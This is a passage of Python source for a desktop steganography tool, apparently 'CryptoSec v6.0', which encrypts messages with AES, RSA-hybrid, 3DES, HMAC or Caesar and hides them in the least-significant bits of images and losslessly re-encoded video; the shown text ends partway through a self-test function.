"""
╔══════════════════════════════════════════════════════════════════════╗
║     CRYPTOSEC  ·  STEGANOGRAPHY SUITE  v6.0  ·  AI + BLOCKCHAIN       ║
║  Ciphers : AES-256 | RSA-2048 (hybrid) | 3DES | SHA256-HMAC |        ║
║            MD5-HMAC | Caesar                                         ║
║  Media   : Image (PNG/JPG/BMP/WEBP) | Video (MP4/AVI/MKV/MOV/WEBM)   ║
║  Ledger  : CryptoChain — signed, hash-linked proof-of-work chain     ║
╚══════════════════════════════════════════════════════════════════════╝

══════════════════════════════════════════════════════════════════════
WHAT'S NEW IN v6.0  —  AI SECURITY CENTER (needs cryptosec_ai.py next to this file)
══════════════════════════════════════════════════════════════════════
One system:  message → AI pre-scan → encryption → hidden in image/video → blockchain → AI monitoring.

  🧠 19 AI modules (cryptosec_ai.py): malware · phishing · intrusion detection & prevention · user behaviour ·
     incident response · vulnerability · network traffic · spam · identity & access · risk prioritisation ·
     log analysis · anomaly · fraud · threat-intel generation · password attacks · DLP · alert classification ·
     predictive analysis · real-time monitoring.  Upload YOUR dataset (CSV/JSON/JSONL/log) → train → detect.
  🔗 Interlinked:  every HIDE is DLP-scanned, cover-scanned (malware + steganalysis), steganalysed after embedding and the
     AI summary is signed into the blockchain record; every REVEAL is scanned, wrong-passphrase streaks are treated as a
     password attack (auto-lock), and the revealed text is checked for phishing/secrets.  High-severity alerts, incident
     cases and trained-model fingerprints are sealed on the same chain (AI_ALERT / AI_CASE / AI_MODEL / AI_SCAN).
  🔌 REST API (127.0.0.1, bearer key):  python cryptosec_v6.py --api   or   API & settings page.
  🐘 PostgreSQL (optional, needs cryptosec_pg.py):  embedded private server or your own.  Alerts, cases, intel, datasets and
     models live in SQL; the blockchain is mirrored into SQL tables you can query; a hash-chained audit log is anchored on the chain.

══════════════════════════════════════════════════════════════════════
WHAT'S NEW IN v5.0  —  CRYPTOCHAIN (BUILT-IN BLOCKCHAIN)
══════════════════════════════════════════════════════════════════════
No new dependencies, no internet, no coins, no server.

  ⛓  Seal on hide      Every hidden file is registered in a personal,
                         append-only proof-of-work blockchain (hash-linked
                         blocks + Merkle roots).  Fingerprints only — never
                         your message, passphrase or keys.
  ✍  Digital signatures Each record is signed with your 
                         identity → proof of origin, non-repudiation.
  ✅ Verify page         Drop any file and/or a proof certificate and get a
                         clear AUTHENTIC / NOT VERIFIED verdict (offline).
  🔓 Trust badge         The Reveal page tells you whether the file you are
                         opening is registered, by whom, and still intact.
  🧾 Delivery receipts   Revealing a message logs a signed receipt.
  📜 Proof certificates  Export a .csproof (machine-checkable) and a
                         printable .html certificate with a Merkle proof.
  🔗 Ledger merge        Import a sender's ledger/certificate; every record
                         is verified individually before it is adopted.
  📌 Checkpoints         Publish one line to make any later rewrite of your
                         history detectable by third parties.
  🔭 Chain explorer      Visual blocks, record browser, one-click validation
                         with tamper detection down to the block.

Requirements
    pip install pillow opencv-python pycryptodome numpy
Optional (recommended)
    pip install imageio-ffmpeg      # bundled FFmpeg → keeps video AUDIO
    pip install tkinterdnd2         # drag & drop files onto the window

══════════════════════════════════════════════════════════════════════
WHY v3.3 WAS SLOW / UNRELIABLE ON VIDEO — AND WHAT v4.1 CHANGES
══════════════════════════════════════════════════════════════════════
1. LOSSY CODECS (root cause of "decode never works / returns garbage")
   XVID, mp4v and MJPG are lossy: re-compressing the frames rewrites the
   least-significant bits that carry the message.  v4.1 only writes video
   with a LOSSLESS codec (FFV1 through FFmpeg, or an OpenCV codec that
   passes a bit-exact round-trip probe) and then VERIFIES the output by
   decoding it before reporting success.

2. LENGTH HEADER INSTEAD OF END-FLAG SCANNING
   Old decoder pulled every LSB of every frame into a Python list of ints
   (millions of objects) and re-searched for "%%END%%" repeatedly.
   New format = "CSEC" + uint32 length + payload.  The decoder knows
   exactly how many bits it needs and stops after the first frame or two
   (typically < 0.1 s).  Old v3.x files are still readable (legacy scan).

3. NUMPY EVERYWHERE
   Bit packing/unpacking, LSB embedding for images and video are fully
   vectorised (no per-pixel / per-bit Python loops).

4. PBKDF2 IN C
   The old KDF used a Python lambda as PRF → 200 000 Python calls
   (~1-3 s per encrypt/decrypt).  hashlib.pbkdf2_hmac runs in C
   (~0.1 s) and produces identical keys, so old AES/3DES payloads
   still decrypt.

5. RESPONSIVE UI
   Heavy work runs in a worker thread; the GUI polls it (no Tk calls
   from threads), shows progress + ETA, and supports Cancel.
   Video preview is driven by Tk's event loop with real frame timing.

Also new: RSA now uses a hybrid scheme (RSA wraps a random AES key) so
long messages work (plain RSA-OAEP maxes out at ~190 bytes).
"""
from __future__ import annotations

import base64
import datetime
import hashlib
import hmac as _hmac
import html
import json
import os
import queue  # noqa: F401  (kept for extensions)
import shutil
import struct
import subprocess
import sys
import tempfile
import threading
import time
import tkinter as tk
import webbrowser
from tkinter import filedialog, messagebox, ttk

import cv2
import numpy as np
from PIL import Image, ImageTk

from Crypto.Cipher import AES, DES3, PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC, RSA
from Crypto.Random import get_random_bytes
from Crypto.Signature import DSS
from Crypto.Util.Padding import pad, unpad

try:                                    # v6 AI engine (optional: all v5 features still work without it)
    import cryptosec_ai as csai
except Exception as _ai_import_error:   # noqa: BLE001
    csai = None

try:  # optional drag & drop
    from tkinterdnd2 import DND_FILES, TkinterDnD
    _DND = True
except Exception:  # pragma: no cover
    _DND = False


# ═══════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═══════════════════════════════════════════════════════════════════════
MAGIC = b"CSEC"
HEADER_LEN = 8                       # 4 magic + 4 length
LEGACY_FLAG = b"%%END%%"             # v3.x end marker
KDF_ITER = 200_000

IMG_EXT = {".png", ".jpg", ".jpeg", ".bmp", ".webp", ".tif", ".tiff"}
VID_EXT = {".mp4", ".avi", ".mkv", ".mov", ".webm", ".m4v", ".wmv"}


class TaskCancelled(Exception):
    pass


def media_kind(path: str) -> str | None:
    ext = os.path.splitext(path)[1].lower()
    if ext in IMG_EXT:
        return "image"
    if ext in VID_EXT:
        return "video"
    return None


def human_size(n: float) -> str:
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024 or unit == "GB":
            return f"{n:,.0f} {unit}" if unit == "B" else f"{n:,.1f} {unit}"
        n /= 1024
    return f"{n} B"


def unique_path(path: str) -> str:
    if not os.path.exists(path):
        return path
    base, ext = os.path.splitext(path)
    i = 2
    while os.path.exists(f"{base}_{i}{ext}"):
        i += 1
    return f"{base}_{i}{ext}"


def reveal_in_folder(path: str):
    try:
        if sys.platform == "win32":
            subprocess.Popen(["explorer", "/select,", os.path.normpath(path)])
        elif sys.platform == "darwin":
            subprocess.Popen(["open", "-R", path])
        else:
            subprocess.Popen(["xdg-open", os.path.dirname(os.path.abspath(path))])
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════════
#  CRYPTO LAYER
# ═══════════════════════════════════════════════════════════════════════
class CryptoEngine:
    @staticmethod
    def _kdf(password: str, salt: bytes, length: int) -> bytes:
        # C implementation; byte-identical to the old PBKDF2(prf=HMAC-SHA256)
        return hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt,
                                   KDF_ITER, dklen=length)

    # ── Caesar ──────────────────────────────────────────────────────────
    @staticmethod
    def caesar_encrypt(text: str, shift: int) -> str:
        out = []
        for ch in text:
            if ch.isascii() and ch.isalpha():
                base = ord("a") if ch.islower() else ord("A")
                out.append(chr((ord(ch) - base + shift) % 26 + base))
            else:
                out.append(ch)
        return "".join(out)

    @staticmethod
    def caesar_decrypt(text: str, shift: int) -> str:
        return CryptoEngine.caesar_encrypt(text, -shift)

    # ── AES-256-CBC ─────────────────────────────────────────────────────
    @staticmethod
    def aes_encrypt(plaintext: str, password: str) -> str:
        salt, iv = get_random_bytes(16), get_random_bytes(16)
        key = CryptoEngine._kdf(password, salt, 32)
        ct = AES.new(key, AES.MODE_CBC, iv).encrypt(
            pad(plaintext.encode("utf-8"), AES.block_size))
        return base64.b64encode(salt + iv + ct).decode()

    @staticmethod
    def aes_decrypt(blob: str, password: str) -> str:
        raw = base64.b64decode(blob)
        salt, iv, ct = raw[:16], raw[16:32], raw[32:]
        key = CryptoEngine._kdf(password, salt, 32)
        return unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct),
                     AES.block_size).decode("utf-8")

    # ── 3DES ────────────────────────────────────────────────────────────
    @staticmethod
    def des3_encrypt(plaintext: str, password: str) -> str:
        salt, iv = get_random_bytes(16), get_random_bytes(8)
        key = CryptoEngine._kdf(password, salt, 24)
        ct = DES3.new(key, DES3.MODE_CBC, iv).encrypt(
            pad(plaintext.encode("utf-8"), DES3.block_size))
        return base64.b64encode(salt + iv + ct).decode()

    @staticmethod
    def des3_decrypt(blob: str, password: str) -> str:
        raw = base64.b64decode(blob)
        salt, iv, ct = raw[:16], raw[16:24], raw[24:]
        key = CryptoEngine._kdf(password, salt, 24)
        return unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(ct),
                     DES3.block_size).decode("utf-8")

    # ── RSA ─────────────────────────────────────────────────────────────
    @staticmethod
    def rsa_generate_keypair():
        key = RSA.generate(2048)
        return key.export_key().decode(), key.publickey().export_key().decode()

    @staticmethod
    def rsa_encrypt(plaintext: str, public_pem: str) -> str:
        """Hybrid: RSA-OAEP wraps a random AES-256 key; AES-CBC encrypts data."""
        key = RSA.import_key(public_pem)
        session, iv = get_random_bytes(32), get_random_bytes(16)
        wrapped = PKCS1_OAEP.new(key).encrypt(session)
        ct = AES.new(session, AES.MODE_CBC, iv).encrypt(
            pad(plaintext.encode("utf-8"), AES.block_size))
        return base64.b64encode(struct.pack(">H", len(wrapped)) + wrapped + iv + ct).decode()

    @staticmethod
    def rsa_decrypt(blob: str, private_pem: str) -> str:
        key = RSA.import_key(private_pem)
        raw = base64.b64decode(blob)
        (klen,) = struct.unpack(">H", raw[:2])
        wrapped, iv, ct = raw[2:2 + klen], raw[2 + klen:18 + klen], raw[18 + klen:]
        session = PKCS1_OAEP.new(key).decrypt(wrapped)
        return unpad(AES.new(session, AES.MODE_CBC, iv).decrypt(ct),
                     AES.block_size).decode("utf-8")

    @staticmethod
    def rsa_decrypt_legacy(blob: str, private_pem: str) -> str:
        key = RSA.import_key(private_pem)
        return PKCS1_OAEP.new(key).decrypt(base64.b64decode(blob)).decode("utf-8")

    # ── HMAC (authentication only — NOT encryption) ─────────────────────
    @staticmethod
    def _hmac_wrap(plaintext: str, password: str, algo) -> str:
        key = algo(password.encode()).digest()
        msg = base64.b64encode(plaintext.encode("utf-8")).decode()
        tag = _hmac.new(key, msg.encode(), algo).hexdigest()
        return base64.b64encode(f"{tag}:{msg}".encode()).decode()

    @staticmethod
    def _hmac_unwrap(blob: str, password: str, algo, name: str) -> str:
        tag, msg = base64.b64decode(blob).decode().split(":", 1)
        key = algo(password.encode()).digest()
        if not _hmac.compare_digest(tag, _hmac.new(key, msg.encode(), algo).hexdigest()):
            raise ValueError(f"{name} verification failed — wrong key or data tampered.")
        return base64.b64decode(msg).decode("utf-8")

    @staticmethod
    def md5_encrypt(p, k): return CryptoEngine._hmac_wrap(p, k, hashlib.md5)
    @staticmethod
    def md5_decrypt(b, k): return CryptoEngine._hmac_unwrap(b, k, hashlib.md5, "MD5-HMAC")
    @staticmethod
    def sha256_encrypt(p, k): return CryptoEngine._hmac_wrap(p, k, hashlib.sha256)
    @staticmethod
    def sha256_decrypt(b, k): return CryptoEngine._hmac_unwrap(b, k, hashlib.sha256, "SHA-256-HMAC")


# cipher catalogue ------------------------------------------------------
GREEN, RED, GOLD, ORANGE, TEAL = "#22C55E", "#EF4444", "#F59E0B", "#FB923C", "#14B8A6"
ACCENT, ACCENT2, MUTED = "#22D3EE", "#8B5CF6", "#7C879B"

CIPHERS = [
    dict(id="aes", name="AES-256 CBC", tag="RECOMMENDED", color=GREEN, mode="pass",
         desc="Strong symmetric encryption. The key is derived from your passphrase with "
              "PBKDF2-SHA256 (200 000 rounds)."),
    dict(id="rsa", name="RSA-2048 Hybrid", tag="PUBLIC KEY", color=ACCENT, mode="rsa",
         desc="Encrypt with a public key; only the matching private key can decrypt. "
              "RSA wraps a random AES key so messages of any length work."),
    dict(id="3des", name="3DES CBC", tag="LEGACY", color=GOLD, mode="pass",
         desc="Triple-DES (192-bit). Kept for compatibility — prefer AES-256."),
    dict(id="sha256", name="SHA-256-HMAC", tag="AUTH ONLY", color=TEAL, mode="pass",
         desc="Tamper detection only. The message is NOT encrypted (just base64 + HMAC tag)."),
    dict(id="md5", name="MD5-HMAC", tag="WEAK · AUTH ONLY", color=ORANGE, mode="pass",
         desc="Integrity tag using MD5 — weak, and the message is NOT encrypted. Prefer SHA-256."),
    dict(id="caesar", name="Caesar Cipher", tag="TOY", color=MUTED, mode="caesar",
         desc="Letter-shift substitution (0–25). Educational only — trivially broken."),
]
CIPHER_BY_ID = {c["id"]: c for c in CIPHERS}
CIPHER_BY_ID["rsa_legacy"] = dict(id="rsa_legacy", name="RSA-2048 OAEP (legacy)",
                                  tag="LEGACY", color=ACCENT, mode="rsa", desc="")
PREFIXES = [("CAESAR:", "caesar"), ("AES:", "aes"), ("RSAH:", "rsa"), ("RSA:", "rsa_legacy"),
            ("3DES:", "3des"), ("MD5:", "md5"), ("SHA256:", "sha256")]
PREFIX_OF = {"caesar": "CAESAR:", "aes": "AES:", "rsa": "RSAH:", "3des": "3DES:",
             "md5": "MD5:", "sha256": "SHA256:"}


def detect_cipher(raw: str) -> str | None:
    for pre, cid in PREFIXES:
        if raw.startswith(pre):
            return cid
    return None


def encrypt_payload(cid: str, message: str, secret) -> str:
    E = CryptoEngine
    body = {
        "caesar": lambda: E.caesar_encrypt(message, int(secret)),
        "aes": lambda: E.aes_encrypt(message, secret),
        "rsa": lambda: E.rsa_encrypt(message, secret),
        "3des": lambda: E.des3_encrypt(message, secret),
        "md5": lambda: E.md5_encrypt(message, secret),
        "sha256": lambda: E.sha256_encrypt(message, secret),
    }[cid]()
    return PREFIX_OF[cid] + body


def decrypt_payload(raw: str, secret) -> tuple[str, str]:
    cid = detect_cipher(raw)
    if cid is None:
        raise ValueError("Unrecognised payload — this file was not made by CryptoSec.")
    body = raw[len(next(p for p, c in PREFIXES if c == cid)):]
    E = CryptoEngine
    fn = {
        "caesar": lambda: E.caesar_decrypt(body, int(secret)),
        "aes": lambda: E.aes_decrypt(body, secret),
        "rsa": lambda: E.rsa_decrypt(body, secret),
        "rsa_legacy": lambda: E.rsa_decrypt_legacy(body, secret),
        "3des": lambda: E.des3_decrypt(body, secret),
        "md5": lambda: E.md5_decrypt(body, secret),
        "sha256": lambda: E.sha256_decrypt(body, secret),
    }[cid]
    return cid, fn()


def estimate_payload_len(cid: str, n: int) -> int:
    """Predict embedded payload size (bytes) without running the cipher."""
    b64 = lambda x: 4 * ((x + 2) // 3)
    if cid == "caesar":
        return 7 + n
    if cid == "aes":
        return 4 + b64(32 + (n // 16 + 1) * 16)
    if cid == "3des":
        return 5 + b64(24 + (n // 8 + 1) * 8)
    if cid == "rsa":
        return 5 + b64(2 + 256 + 16 + (n // 16 + 1) * 16)
    if cid == "md5":
        return 4 + b64(32 + 1 + b64(n))
    return 7 + b64(64 + 1 + b64(n))


def password_strength(pw: str) -> tuple[float, str, str]:
    if not pw:
        return 0.0, "", MUTED
    score = min(len(pw), 16) / 16 * 0.5
    score += 0.125 * sum([any(c.islower() for c in pw), any(c.isupper() for c in pw),
                          any(c.isdigit() for c in pw), any(not c.isalnum() for c in pw)])
    if score < 0.4:
        return max(score, 0.1), "Weak", RED
    if score < 0.7:
        return score, "Fair", GOLD
    if score < 0.9:
        return score, "Good", TEAL
    return 1.0, "Strong", GREEN


def friendly_error(e: BaseException) -> str:
    s = str(e)
    low = s.lower()
    if ("padding" in low or "incorrect decryption" in low or "decryption failed" in low
            or "mac check" in low or "verification failed" in low
            or ("utf-8" in low and "codec" in low)):
        return ("That passphrase / key did not work.\n\nPlease check:\n"
                "  •  Capital and small letters matter\n"
                "  •  No extra spaces at the start or end\n"
                "  •  It is the SAME passphrase you used when hiding the message\n"
                "  •  You chose the file that starts with  steg_encoded_  (not the original)")
    if "no hidden" in low or "truncated" in low:
        return ("No hidden message was found in this file.\n\n"
                "  •  Choose the file that “Hide a message” created (its name starts with  steg_encoded_ ), "
                "not the original.\n"
                "  •  Files that were edited, re-saved, screenshotted or sent as a normal photo/video through "
                "WhatsApp, Telegram or social media lose the message — send them as a FILE / DOCUMENT.\n"
                "  •  JPEG photos cannot hold a message.")
    if "too long" in low or "too large" in low:
        return ("Your message is too long for this file.\n\nUse a bigger picture, a longer video, "
                "or shorten the message.")
    return s or e.__class__.__name__


# ═══════════════════════════════════════════════════════════════════════
#  STEGANOGRAPHY CORE  (vectorised)
# ═══════════════════════════════════════════════════════════════════════
def build_blob(payload: str) -> bytes:
    data = payload.encode("utf-8")
    return MAGIC + struct.pack(">I", len(data)) + data


class _StreamParser:
    """Incrementally turns a stream of LSB arrays into the hidden payload.
    Stops as soon as the length-prefixed payload is complete (new format)
    or the %%END%% marker is found (legacy v3.x format)."""

    def __init__(self, max_bytes: int | None = None, max_legacy: int = 8 << 20):
        self.buf = bytearray()
        self.carry = np.empty(0, np.uint8)
        self.target: int | None = None
        self.legacy = False
        self.result: str | None = None
        self.max_bytes = max_bytes
        self.max_legacy = max_legacy

    def feed(self, lsb: np.ndarray) -> bool:
        if self.carry.size:
            lsb = np.concatenate((self.carry, lsb))
        n8 = (lsb.size // 8) * 8
        self.carry = lsb[n8:].copy()
        if n8 == 0:
            return False
        old = len(self.buf)
        self.buf.extend(np.packbits(lsb[:n8]).tobytes())

        if self.target is None and not self.legacy and len(self.buf) >= HEADER_LEN:
            if bytes(self.buf[:4]) == MAGIC:
                (n,) = struct.unpack(">I", bytes(self.buf[4:8]))
                self.target = HEADER_LEN + n
                if self.max_bytes is not None and self.target > self.max_bytes:
                    raise ValueError("No hidden CryptoSec message found (invalid header).")
            else:
                self.legacy = True

        if self.target is not None:
            if len(self.buf) >= self.target:
                self.result = bytes(self.buf[HEADER_LEN:self.target]).decode("utf-8", "replace")
                return True
        elif self.legacy:
            idx = self.buf.find(LEGACY_FLAG, max(0, old - len(LEGACY_FLAG)))
            if idx != -1:
                self.result = bytes(self.buf[:idx]).decode("utf-8", "replace")
                return True
            if len(self.buf) > self.max_legacy:
                raise ValueError("No hidden CryptoSec message found.")
        return False

    def finish(self) -> str:
        if self.result is not None:
            return self.result
        if self.target is not None:
            raise ValueError("Hidden data is truncated — the file may have been re-compressed or cropped.")
        raise ValueError("No hidden CryptoSec message found.")


def image_encode(image_path: str, payload: str, progress_cb=None) -> str:
    img = Image.open(image_path).convert("RGB")
    arr = np.array(img, dtype=np.uint8)
    flat = arr.reshape(-1)
    bits = np.unpackbits(np.frombuffer(build_blob(payload), dtype=np.uint8))
    if bits.size > flat.size:
        raise ValueError(f"Message too long for this image.\nNeed {bits.size:,} bits, "
                         f"image holds {flat.size:,} bits.")
    flat[:bits.size] = (flat[:bits.size] & np.uint8(0xFE)) | bits
    base = os.path.splitext(os.path.basename(image_path))[0]
    out = unique_path(os.path.join(os.path.dirname(os.path.abspath(image_path)),
                                   f"steg_encoded_{base}.png"))
    Image.fromarray(arr).save(out)           # PNG = lossless
    return out


def image_decode(image_path: str, progress_cb=None) -> str:
    flat = np.array(Image.open(image_path).convert("RGB"), dtype=np.uint8).reshape(-1)
    p = _StreamParser(max_bytes=flat.size // 8)
    p.feed(flat & np.uint8(1))
    return p.finish()


# ── video ----------------------------------------------------------------
def _find_ffmpeg() -> str | None:
    exe = shutil.which("ffmpeg")
    if exe:
        return exe
    try:
        import imageio_ffmpeg  # type: ignore
        return imageio_ffmpeg.get_ffmpeg_exe()
    except Exception:
        return None


class _FFmpegWriter:
    """Pipes raw BGR frames to FFmpeg → FFV1 (lossless) in MKV, copying audio."""

    def __init__(self, exe, out_path, w, h, fps, audio_src=None):
        self._err = tempfile.TemporaryFile()
        cmd = [exe, "-y", "-loglevel", "error", "-f", "rawvideo", "-pix_fmt", "bgr24",
               "-s", f"{w}x{h}", "-r", f"{fps:.5f}", "-i", "pipe:0"]
        if audio_src:
            cmd += ["-i", audio_src]
        cmd += ["-map", "0:v:0"]
        if audio_src:
            cmd += ["-map", "1:a:0?"]
        cmd += ["-c:v", "ffv1", "-level", "3", "-pix_fmt", "bgr0"]
        if audio_src:
            cmd += ["-c:a", "copy"]
        cmd.append(out_path)
        flags = 0x08000000 if os.name == "nt" else 0       # no console flash
        self.p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.DEVNULL,
                                  stderr=self._err, creationflags=flags)
        self._closed = False

    def _stderr(self) -> str:
        self._err.seek(0)
        return self._err.read().decode(errors="replace")[-400:]

    def write(self, frame):
        try:
            self.p.stdin.write(frame.tobytes())
        except (BrokenPipeError, OSError):
            raise RuntimeError("FFmpeg stopped unexpectedly: " + self._stderr())

    def release(self):
        if self._closed:
            return
        self._closed = True
        try:
            self.p.stdin.close()
        except Exception:
            pass
        if self.p.wait() != 0:
            raise RuntimeError("FFmpeg failed: " + self._stderr())


class _RawAviWriter:
    """Pure-Python UNCOMPRESSED AVI writer.  Always lossless, needs no codec,
    FFmpeg or OpenCV encoder.  Files are large, so it is the last resort."""
    MAX_BYTES = 3_900_000_000

    def __init__(self, path, w, h, fps):
        self.f = open(path, "wb")
        self.w, self.h, self.fps = w, h, fps
        self.stride = (w * 3 + 3) & ~3
        self.fsize = self.stride * h
        self.n = 0
        self._closed = False
        self.f.write(self._header(0))

    def _header(self, n: int) -> bytes:
        fps, fs = self.fps, self.fsize
        avih = struct.pack("<14I", int(1e6 / fps), int(fs * fps), 0, 0x10, n, 0, 1, fs,
                           self.w, self.h, 0, 0, 0, 0)
        strh = struct.pack("<4s4sIHHIIIIIIIIhhhh", b"vids", b"DIB ", 0, 0, 0, 0, 1000,
                           max(1, int(fps * 1000)), 0, n, fs, 0xFFFFFFFF, 0, 0, 0, self.w, self.h)
        strf = struct.pack("<IiiHHIIiiII", 40, self.w, -self.h, 1, 24, 0, fs, 0, 0, 0, 0)  # -h = top-down
        strl = b"strl" + b"strh" + struct.pack("<I", 56) + strh + b"strf" + struct.pack("<I", 40) + strf
        hdrl = b"hdrl" + b"avih" + struct.pack("<I", 56) + avih + b"LIST" + struct.pack("<I", len(strl)) + strl
        movi_size = 4 + n * (8 + fs)
        riff_size = 4 + (8 + len(hdrl)) + (8 + movi_size) + (8 + n * 16)
        return (b"RIFF" + struct.pack("<I", riff_size) + b"AVI " + b"LIST" + struct.pack("<I", len(hdrl)) + hdrl
                + b"LIST" + struct.pack("<I", movi_size) + b"movi")

    def write(self, frame):
        if (self.n + 1) * (self.fsize + 24) > self.MAX_BYTES:
            raise RuntimeError("This video is too long for the built-in AVI writer (4 GB limit). "
                               "Install the video helper (imageio-ffmpeg) or use a shorter clip.")
        rows = np.ascontiguousarray(frame).reshape(self.h, self.w * 3)
        if self.stride != self.w * 3:
            buf = np.zeros((self.h, self.stride), np.uint8)
            buf[:, :self.w * 3] = rows
            rows = buf
        self.f.write(b"00db" + struct.pack("<I", self.fsize) + rows.tobytes())
        self.n += 1

    def release(self):
        if self._closed:
            return
        self._closed = True
        idx = bytearray()
        off = 4
        for _ in range(self.n):
            idx += b"00db" + struct.pack("<III", 0x10, off, self.fsize)
            off += 8 + self.fsize
        self.f.write(b"idx1" + struct.pack("<I", len(idx)) + bytes(idx))
        self.f.seek(0)
        self.f.write(self._header(self.n))
        self.f.close()


_LOSSLESS_CV_CODECS = [("FFV1", ".avi"), ("HFYU", ".avi"), ("DIB ", ".avi")]
_probe_cache: dict = {}


def _cv_codec_is_lossless(fourcc: str, w: int, h: int, fps: float) -> bool:
    """Bit-exact round-trip probe with random noise frames."""
    key = (fourcc, w, h)
    if key in _probe_cache:
        return _probe_cache[key]
    ok = False
    fd, tmp = tempfile.mkstemp(suffix=".avi")
    os.close(fd)
    try:
        wr = cv2.VideoWriter(tmp, cv2.VideoWriter_fourcc(*fourcc), fps, (w, h))
        if wr.isOpened():
            rng = np.random.default_rng(7)
            frames = [rng.integers(0, 256, (h, w, 3), dtype=np.uint8) for _ in range(2)]
            for f in frames:
                wr.write(f)
            wr.release()
            cap = cv2.VideoCapture(tmp)
            ok = True
            for f in frames:
                r, g = cap.read()
                if not r or g is None or not np.array_equal(g, f):
                    ok = False
                    break
            cap.release()
        else:
            wr.release()
    except Exception:
        ok = False
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass
    _probe_cache[key] = ok
    return ok


def _writer_factories(src, w, h, fps, out_base):
    """Yield (description, out_path, factory) — best option first."""
    ff = _find_ffmpeg()
    if ff:
        out = out_base + ".mkv"
        yield ("FFmpeg · FFV1 lossless (audio kept)", out,
               lambda: _FFmpegWriter(ff, out, w, h, fps, src))
        yield ("FFmpeg · FFV1 lossless (no audio)", out,
               lambda: _FFmpegWriter(ff, out, w, h, fps, None))
    for fourcc, ext in _LOSSLESS_CV_CODECS:
        if _cv_codec_is_lossless(fourcc, w, h, fps):
            out = out_base + ext

            def make(out=out, fourcc=fourcc):
                wr = cv2.VideoWriter(out, cv2.VideoWriter_fourcc(*fourcc), fps, (w, h))
                if not wr.isOpened():
                    raise RuntimeError("Could not open " + fourcc)
                return wr
            yield (f"OpenCV · {fourcc.strip()} lossless (no audio)", out, make)
    out = out_base + ".avi"
    yield ("Built-in uncompressed AVI (lossless, large file, no audio)", out,
           lambda: _RawAviWriter(out, w, h, fps))


def video_info(path: str) -> dict:
    cap = cv2.VideoCapture(path)
    if not cap.isOpened():
        raise ValueError(f"Cannot open video: {path}")
    d = dict(w=int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)), h=int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)),
             fps=cap.get(cv2.CAP_PROP_FPS) or 25.0, frames=int(cap.get(cv2.CAP_PROP_FRAME_COUNT)))
    cap.release()
    return d


def video_encode(video_path: str, payload: str, progress_cb=None) -> tuple[str, str]:
    """Hide payload in the first frame(s); re-write the whole clip losslessly.
    Returns (output_path, engine_description)."""
    info = video_info(video_path)
    w, h, fps, total = info["w"], info["h"], info["fps"], info["frames"]
    bits = np.unpackbits(np.frombuffer(build_blob(payload), dtype=np.uint8))
    if bits.size > w * h * 3 * max(total, 1):
        raise ValueError(f"Payload too large for this video.\nNeed {bits.size:,} bits; "
                         f"video holds {w * h * 3 * max(total, 1):,} bits.")

    base = os.path.splitext(os.path.basename(video_path))[0]
    out_base = os.path.join(os.path.dirname(os.path.abspath(video_path)), f"steg_encoded_{base}")
    last_err: Exception | None = None

    for desc, out_path, make in _writer_factories(video_path, w, h, fps, out_base):
        try:
            writer = make()
        except Exception as e:
            last_err = e
            continue
        cap = cv2.VideoCapture(video_path)
        ok = False
        try:
            bit_idx, fn = 0, 0
            n = bits.size
            while True:
                ret, frame = cap.read()
                if not ret:
                    break
                if bit_idx < n:
                    frame = np.ascontiguousarray(frame)
                    flat = frame.reshape(-1)               # view → edits land in `frame`
                    k = min(flat.size, n - bit_idx)
                    flat[:k] = (flat[:k] & np.uint8(0xFE)) | bits[bit_idx:bit_idx + k]
                    bit_idx += k
                writer.write(frame)
                fn += 1
                if progress_cb:
                    progress_cb(fn, total)
            if bit_idx < n:
                raise ValueError("Video ended before the payload was fully embedded "
                                 "(unreliable frame count). Try a longer clip.")
            writer.release()
            ok = True
            if progress_cb:
                progress_cb(total, total)
            return out_path, desc
        except RuntimeError as e:          # writer problem → try next engine
            last_err = e
        finally:
            cap.release()
            if not ok:
                try:
                    writer.release()
                except Exception:
                    pass
                try:
                    os.remove(out_path)
                except OSError:
                    pass
    raise RuntimeError(
        "No lossless video writer is available, so the hidden data would be destroyed.\n"
        "Fix: pip install imageio-ffmpeg   (or install FFmpeg and add it to PATH).\n"
        + (f"Last error: {last_err}" if last_err else ""))


def video_decode(video_path: str, progress_cb=None) -> str:
    cap = cv2.VideoCapture(video_path)
    if not cap.isOpened():
        raise ValueError(f"Cannot open video: {video_path}")
    total = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))
    w, h = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)), int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    cap_bytes = (w * h * 3 * total) // 8 if total > 0 else None
    parser = _StreamParser(max_bytes=cap_bytes)
    fn = 0
    try:
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            fn += 1
            if not frame.flags.c_contiguous:
                frame = np.ascontiguousarray(frame)
            if parser.feed(frame.reshape(-1) & np.uint8(1)):
                break
            if progress_cb:
                progress_cb(fn, total)
    finally:
        cap.release()
    return parser.finish()


def media_info(path: str) -> dict:
    kind = media_kind(path)
    if kind == "image":
        with Image.open(path) as im:
            w, h = im.size
        return dict(kind=kind, w=w, h=h, frames=1, fps=0,
                    capacity=max(0, w * h * 3 // 8 - HEADER_LEN))
    if kind == "video":
        v = video_info(path)
        return dict(kind=kind, **v, capacity=max(0, v["frames"] * v["w"] * v["h"] * 3 // 8 - HEADER_LEN))
    raise ValueError("Unsupported file type.")


def run_self_test(rep) -> list:
    """Checks every part of the pipeline on tiny files. Returns [(ok, text)]."""
    res = []
    add = lambda ok, t: res.append((ok, t))
    tmp = tempfile.mkdtemp(prefix="csec_test_")
    rng = np.random.default_rng(3)
    try:
        rep(0, 8, "Testing encryption…")
        pub_priv = None
        for cid, sec in (("aes", "pw"), ("3des", "pw"), ("sha256", "pw"), ("caesar", 3)):
            try:
                _, plain = decrypt_payload(encrypt_payload(cid, "hello ✓", sec), sec)
                add(plain == "hello ✓", f"Encryption  {CIPHER_BY_ID[cid]['name']}")
            except Exception as e:
                add(False, f"Encryption  {cid}: {e}")
        rep(1, 8, "Testing RSA…")
        try:
